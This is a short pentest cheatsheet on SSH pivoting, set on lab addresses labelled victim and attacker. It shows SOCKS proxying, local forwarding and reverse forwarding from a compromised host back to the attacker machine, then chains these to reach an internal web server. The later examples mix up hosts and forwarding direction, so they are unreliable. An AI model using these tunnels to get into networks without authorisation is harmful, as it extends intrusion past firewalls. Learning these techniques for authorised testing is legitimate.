## SSH Cheatsheet / Blackmagic

SSH has a lot of exciting features when it comes to pivoting in a pentest environment; btw most of it stemmed from devops situations :P. This is assuming you having ssh access on your victim, probably with root privilleges.

192.168.56.201 -> Victim Machine
192.168.56.202 -> Attacker Machine

The -f Commands forks the process into background and -N will not execute remote commands so you don't see a bash terminal but it runs in background.Good for crappy shells with less interaction
### 1. Socks Proxy
	ssh -D 127.0.0.1:1080 victim@192.168.56.201 -f -N
Creates a socks proxy tunnel via your local machine at local port 1080

### 2. Local Port Forwarding
	ssh -L 9999:localhost:22 victim@192.168.56.201 -f -N
    
Let's assume you have popped a box (low priv) which has ssh service running but the firewall blocks it from outside and for some wierd reason port 9999 is acessible from the outside.
You could do the above mentioned to Locally forward 22 to 9999
    
### 3. Remote Port Forwarding
The most useful commnand you will ever use in your life; execute at victim machine  

	ssh -R 6666:localhost:22 attacker@192.168.56.202
This forwards localport (ssh of the victim) to your system local port 6666 through an ssh tunnel.

You could then connct using ssh victim@localhost -p 6666 

You could do something cooler too , assuming you have a machine on the victim network 210 and you want to access it's web port directly from your attacker machine you can do this -  

	ssh -R localhost:9060:192.168.56.210:80 victim@192.168.56.201

Here you setup a secure SSH tunnel on the localport (attacker) 9060 which has a direct connection to port 80 of 210 ( a machine on victim network), cool eh ?

After that you could do
	ssh -R 7777:localhost:9060 attacker@192.168.56.201 -f -N
    
 This would remtely forward port 9060 on victim machine to your localport 7777.
 So basically you could browse port 80 on machine 192.168.56.210 from your own browser by pointing to http://localhost:7777
 
_More example coming soon. Please tweet out to @0xrnair in case you need clarifications_ ----
 

References:
1. [The Black Magic of SSH / SSH Can do that ?](https://vimeo.com/54505525) 
2. [Why aren't we using SSH for everything](https://medium.com/swlh/ssh-how-does-it-even-9e43586e4ffc#.hjbor5jlu)
